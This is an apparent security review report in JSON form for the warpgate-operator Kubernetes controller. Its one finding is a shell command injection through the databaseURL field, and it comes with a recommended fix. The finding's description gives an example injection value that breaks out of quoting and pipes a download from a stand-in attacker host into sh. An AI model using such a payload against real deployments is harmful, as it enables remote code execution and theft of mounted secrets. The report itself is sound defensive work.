@@ -1,0 +1,36 @@
+{
+  "summary": "Reviewed the warpgate-operator Go controller code under internal/, cmd/, and api/ (Warpgate API client, all reconcilers, and admission webhooks). The operator is a Kubernetes controller that provisions Warpgate deployments and syncs users/credentials/targets to a Warpgate instance over HTTP. Overall the code handles Secrets carefully (no credential values are logged, passwords use crypto/rand, TLS skip-verify is an explicit opt-in). The one concrete flaw is a shell command injection: the user-controlled spec.databaseURL of a WarpgateInstance is interpolated unescaped into the init-container shell script. Coverage was source-only (no build/run); test files were skipped.",
+  "coverage": [
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/ssh_keys.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/warpgateuser_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgatepublickeycredential_controller.go",
+    "internal/controller/warpgatetarget_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateconnection_webhook.go",
+    "api/v1alpha1/warpgatetarget_types.go",
+    "api/v1alpha1/warpgateconnection_types.go",
+    "cmd/main.go"
+  ],
+  "findings": [
+    {
+      "title": "Shell command injection via WarpgateInstance spec.databaseURL in init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "medium",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment builds a `/bin/sh -c` init script by string concatenation and interpolates the user-controlled field inst.Spec.DatabaseURL directly into the `warpgate ... unattended-setup --database-url \"%s\"` command with fmt.Sprintf. The value is only enclosed in double quotes, so a databaseURL such as `sqlite:/data/db\";curl http://attacker/x|sh;echo \"` breaks out of the quoting and executes arbitrary shell commands in the init container. The value is never validated: the WarpgateInstance validating webhook (api/v1alpha1/warpgateinstance_webhook.go validateWarpgateInstance) only emits an informational warning for databaseURL and performs no character/escaping checks. The injected commands run in the init container, which has the admin-password Secret mounted as the ADMIN_PASSWORD env var and (when configured) the TLS key and SSH host/client key Secrets mounted, so injection can exfiltrate those secrets. Anyone able to create or update a WarpgateInstance CR can reach this sink.",
+      "evidence": "L549-558: setupCmd := fmt.Sprintf(`warpgate --skip-securing-files unattended-setup --data-path /data --http-port %d --admin-password \"${ADMIN_PASSWORD}\"`, ...); if inst.Spec.DatabaseURL != \"\" { setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL) }. setupCmd is then joined into initScript (L567-611) and run as Command: []string{\"/bin/sh\", \"-c\", initScript} (L776). No sanitization of DatabaseURL exists in the webhook.",
+      "recommendation": "Do not interpolate untrusted values into a shell string. Pass the database URL to the warpgate binary as a discrete argument vector (e.g. build the init container command as an argv slice rather than a `sh -c` string), or pass DatabaseURL via an environment variable populated from a Secret/field and reference it with proper quoting the way ADMIN_PASSWORD is handled. At minimum, add strict validation in the validating webhook that rejects databaseURL values containing shell metacharacters (\", `, $, ;, |, &, newline, etc.)."
+    }
+  ]
+}
